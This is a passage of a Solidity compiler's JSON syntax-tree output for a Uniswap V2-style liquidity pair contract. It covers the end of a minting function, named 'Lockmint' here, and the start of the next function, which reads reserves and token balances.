																		"src": "7243:35:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																			"typeString": "function (uint256,uint256) pure returns (uint256)"
																		}
																	},
																	"id": 1619,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "functionCall",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "7243:54:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "7231:66:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 1621,
															"nodeType": "ExpressionStatement",
															"src": "7231:66:6"
														},
														{
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"arguments": [
																			{
																				"argumentTypes": null,
																				"hexValue": "30",
																				"id": 1624,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "7330:1:6",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_0_by_1",
																					"typeString": "int_const 0"
																				},
																				"value": "0"
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_rational_0_by_1",
																					"typeString": "int_const 0"
																				}
																			],
																			"id": 1623,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"lValueRequested": false,
																			"nodeType": "ElementaryTypeNameExpression",
																			"src": "7322:7:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_type$_t_address_$",
																				"typeString": "type(address)"
																			},
																			"typeName": "address"
																		},
																		"id": 1625,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "typeConversion",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "7322:10:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address_payable",
																			"typeString": "address payable"
																		}
																	},
																	{
																		"argumentTypes": null,
																		"id": 1626,
																		"name": "MINIMUM_LIQUIDITY",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 955,
																		"src": "7334:17:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_address_payable",
																			"typeString": "address payable"
																		},
																		{
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	],
																	"id": 1622,
																	"name": "freezeMint",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 172,
																	"src": "7311:10:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_uint256_$returns$_t_bool_$",
																		"typeString": "function (address,uint256) returns (bool)"
																	}
																},
																"id": 1627,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "7311:41:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"id": 1628,
															"nodeType": "ExpressionStatement",
															"src": "7311:41:6"
														}
													]
												}
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 1653,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 1651,
																"name": "liquidity",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1550,
																"src": "7610:9:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 1652,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "7622:1:6",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "7610:13:6",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "556e697377617056323a20494e53554646494349454e545f4c49515549444954595f4d494e544544",
															"id": 1654,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "7625:42:6",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_6591c9f5bf1fefaad109b76a20e25c857b696080c952191f86220f001a83663e",
																"typeString": "literal_string \"UniswapV2: INSUFFICIENT_LIQUIDITY_MINTED\""
															},
															"value": "UniswapV2: INSUFFICIENT_LIQUIDITY_MINTED"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_6591c9f5bf1fefaad109b76a20e25c857b696080c952191f86220f001a83663e",
																"typeString": "literal_string \"UniswapV2: INSUFFICIENT_LIQUIDITY_MINTED\""
															}
														],
														"id": 1650,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															2359,
															2360
														],
														"referencedDeclaration": 2360,
														"src": "7602:7:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 1655,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "7602:66:6",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1656,
												"nodeType": "ExpressionStatement",
												"src": "7602:66:6"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1658,
															"name": "to",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1545,
															"src": "7689:2:6",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 1659,
															"name": "liquidity",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1550,
															"src": "7693:9:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 1657,
														"name": "freezeMint",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 172,
														"src": "7678:10:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_uint256_$returns$_t_bool_$",
															"typeString": "function (address,uint256) returns (bool)"
														}
													},
													"id": 1660,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "7678:25:6",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 1661,
												"nodeType": "ExpressionStatement",
												"src": "7678:25:6"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1663,
															"name": "balance0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1560,
															"src": "7722:8:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"id": 1664,
															"name": "balance1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1571,
															"src": "7732:8:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"id": 1665,
															"name": "_reserve0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1553,
															"src": "7742:9:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														},
														{
															"argumentTypes": null,
															"id": 1666,
															"name": "_reserve1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1555,
															"src": "7753:9:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															},
															{
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														],
														"id": 1662,
														"name": "_update",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1286,
														"src": "7714:7:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_uint256_$_t_uint256_$_t_uint112_$_t_uint112_$returns$__$",
															"typeString": "function (uint256,uint256,uint112,uint112)"
														}
													},
													"id": 1667,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "7714:49:6",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1668,
												"nodeType": "ExpressionStatement",
												"src": "7714:49:6"
											},
											{
												"condition": {
													"argumentTypes": null,
													"id": 1669,
													"name": "feeOn",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 1596,
													"src": "7777:5:6",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 1679,
												"nodeType": "IfStatement",
												"src": "7773:47:6",
												"trueBody": {
													"expression": {
														"argumentTypes": null,
														"id": 1677,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftHandSide": {
															"argumentTypes": null,
															"id": 1670,
															"name": "kLast",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 984,
															"src": "7784:5:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "Assignment",
														"operator": "=",
														"rightHandSide": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1675,
																	"name": "reserve1",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 976,
																	"src": "7811:8:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint112",
																		"typeString": "uint112"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint112",
																		"typeString": "uint112"
																	}
																],
																"expression": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"id": 1672,
																			"name": "reserve0",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 974,
																			"src": "7797:8:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint112",
																				"typeString": "uint112"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_uint112",
																				"typeString": "uint112"
																			}
																		],
																		"id": 1671,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "7792:4:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_uint256_$",
																			"typeString": "type(uint256)"
																		},
																		"typeName": "uint"
																	},
																	"id": 1673,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "7792:14:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"id": 1674,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "mul",
																"nodeType": "MemberAccess",
																"referencedDeclaration": 2298,
																"src": "7792:18:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																	"typeString": "function (uint256,uint256) pure returns (uint256)"
																}
															},
															"id": 1676,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "7792:28:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"src": "7784:36:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 1678,
													"nodeType": "ExpressionStatement",
													"src": "7784:36:6"
												}
											},
											{
												"eventCall": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"id": 1681,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 2356,
																"src": "7880:3:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 1682,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "sender",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "7880:10:6",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														{
															"argumentTypes": null,
															"id": 1683,
															"name": "amount0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1582,
															"src": "7892:7:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"id": 1684,
															"name": "amount1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1589,
															"src": "7901:7:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 1680,
														"name": "Mint",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															1104
														],
														"referencedDeclaration": 1104,
														"src": "7875:4:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_event_nonpayable$_t_address_$_t_uint256_$_t_uint256_$returns$__$",
															"typeString": "function (address,uint256,uint256)"
														}
													},
													"id": 1685,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "7875:34:6",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1686,
												"nodeType": "EmitStatement",
												"src": "7870:39:6"
											}
										]
									},
									"documentation": null,
									"id": 1688,
									"implemented": true,
									"kind": "function",
									"modifiers": [
										{
											"arguments": null,
											"id": 1548,
											"modifierName": {
												"argumentTypes": null,
												"id": 1547,
												"name": "lock",
												"nodeType": "Identifier",
												"overloadedDeclarations": [],
												"referencedDeclaration": 1008,
												"src": "6674:4:6",
												"typeDescriptions": {
													"typeIdentifier": "t_modifier$__$",
													"typeString": "modifier ()"
												}
											},
											"nodeType": "ModifierInvocation",
											"src": "6674:4:6"
										}
									],
									"name": "Lockmint",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1546,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1545,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 1688,
												"src": "6653:10:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1544,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "6653:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "6652:12:6"
									},
									"returnParameters": {
										"id": 1551,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1550,
												"name": "liquidity",
												"nodeType": "VariableDeclaration",
												"scope": 1688,
												"src": "6688:14:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1549,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "6688:4:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "6687:16:6"
									},
									"scope": 2224,
									"src": "6635:1281:6",
									"stateMutability": "nonpayable",
									"superFunction": 814,
									"visibility": "external"
								},
								{
									"body": {
										"id": 1851,
										"nodeType": "Block",
										"src": "8116:1338:6",
										"statements": [
											{
												"assignments": [
													1700,
													1702,
													null
												],
												"declarations": [
													{
														"constant": false,
														"id": 1700,
														"name": "_reserve0",
														"nodeType": "VariableDeclaration",
														"scope": 1851,
														"src": "8127:17:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint112",
															"typeString": "uint112"
														},
														"typeName": {
															"id": 1699,
															"name": "uint112",
															"nodeType": "ElementaryTypeName",
															"src": "8127:7:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														},
														"value": null,
														"visibility": "internal"
													},
													{
														"constant": false,
														"id": 1702,
														"name": "_reserve1",
														"nodeType": "VariableDeclaration",
														"scope": 1851,
														"src": "8146:17:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint112",
															"typeString": "uint112"
														},
														"typeName": {
															"id": 1701,
															"name": "uint112",
															"nodeType": "ElementaryTypeName",
															"src": "8146:7:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														},
														"value": null,
														"visibility": "internal"
													},
													null
												],
												"id": 1705,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"id": 1703,
														"name": "getReserves",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1054,
														"src": "8169:11:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_view$__$returns$_t_uint112_$_t_uint112_$_t_uint32_$",
															"typeString": "function () view returns (uint112,uint112,uint32)"
														}
													},
													"id": 1704,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "8169:13:6",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$_t_uint112_$_t_uint112_$_t_uint32_$",
														"typeString": "tuple(uint112,uint112,uint32)"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "8126:56:6"
											},
											{
												"assignments": [
													1707
												],
												"declarations": [
													{
														"constant": false,
														"id": 1707,
														"name": "_token0",
														"nodeType": "VariableDeclaration",
														"scope": 1851,
														"src": "8207:15:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														},
														"typeName": {
															"id": 1706,
															"name": "address",
															"nodeType": "ElementaryTypeName",
															"src": "8207:7:6",
															"stateMutability": "nonpayable",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1709,
												"initialValue": {
													"argumentTypes": null,
													"id": 1708,
													"name": "token0",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 968,
													"src": "8225:6:6",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "8207:24:6"
											},
											{
												"assignments": [
													1711
												],
												"declarations": [
													{
														"constant": false,
														"id": 1711,
														"name": "_token1",
														"nodeType": "VariableDeclaration",
														"scope": 1851,
														"src": "8256:15:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														},
														"typeName": {
															"id": 1710,
															"name": "address",
															"nodeType": "ElementaryTypeName",
															"src": "8256:7:6",
															"stateMutability": "nonpayable",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1713,
												"initialValue": {
													"argumentTypes": null,
													"id": 1712,
													"name": "token1",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 970,
													"src": "8274:6:6",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "8256:24:6"
											},
											{
												"assignments": [
													1715
												],
												"declarations": [
													{
														"constant": false,
														"id": 1715,
														"name": "balance0",
														"nodeType": "VariableDeclaration",
														"scope": 1851,
														"src": "8305:13:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1714,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "8305:4:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1724,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1721,
																	"name": "this",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 2386,
																	"src": "8355:4:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_contract$_Pair_$2224",
																		"typeString": "contract Pair"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_contract$_Pair_$2224",
																		"typeString": "contract Pair"
																	}
																],
																"id": 1720,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "8347:7:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": "address"
															},
															"id": 1722,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "8347:13:6",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														],
														"expression": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1717,
																	"name": "_token0",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1707,
																	"src": "8328:7:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 1716,
																"name": "IERC20",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 533,
																"src": "8321:6:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_contract$_IERC20_$533_$",
																	"typeString": "type(contract IERC20)"
																}
															},
															"id": 1718,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "8321:15:6",
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_IERC20_$533",
																"typeString": "contract IERC20"
															}
														},
														"id": 1719,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "balanceOf",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 494,
														"src": "8321:25:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
															"typeString": "function (address) view external returns (uint256)"
														}
													},
													"id": 1723,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "8321:40:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "8305:56:6"
											},
											{
												"assignments": [
													1726
												],
												"declarations": [
													{
														"constant": false,
														"id": 1726,
														"name": "balance1",
														"nodeType": "VariableDeclaration",
														"scope": 1851,
														"src": "8371:13:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1725,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "8371:4:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1735,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1732,
																	"name": "this",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 2386,
																	"src": "8421:4:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_contract$_Pair_$2224",
																		"typeString": "contract Pair"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_contract$_Pair_$2224",
																		"typeString": "contract Pair"
																	}
																],
																"id": 1731,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "8413:7:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": "address"
															},
															"id": 1733,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "8413:13:6",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														],
														"expression": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1728,
																	"name": "_token1",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1711,
																	"src": "8394:7:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 1727,
																"name": "IERC20",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 533,
																"src": "8387:6:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_contract$_IERC20_$533_$",
																	"typeString": "type(contract IERC20)"
																}
															},
															"id": 1729,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "8387:15:6",
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_IERC20_$533",
																"typeString": "contract IERC20"
															}
														},
														"id": 1730,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "balanceOf",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 494,
														"src": "8387:25:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
															"typeString": "function (address) view external returns (uint256)"
														}
													},
													"id": 1734,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "8387:40:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "8371:56:6"
											},
											{
												"assignments": [
													1737
												],
												"declarations": [
													{
														"constant": false,
														"id": 1737,
														"name": "liquidity",
														"nodeType": "VariableDeclaration",
														"scope": 1851,
														"src": "8437:14:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1736,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "8437:4:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1743,
												"initialValue": {
													"argumentTypes": null,
													"baseExpression": {
														"argumentTypes": null,
														"id": 1738,
														"name": "balanceOf",
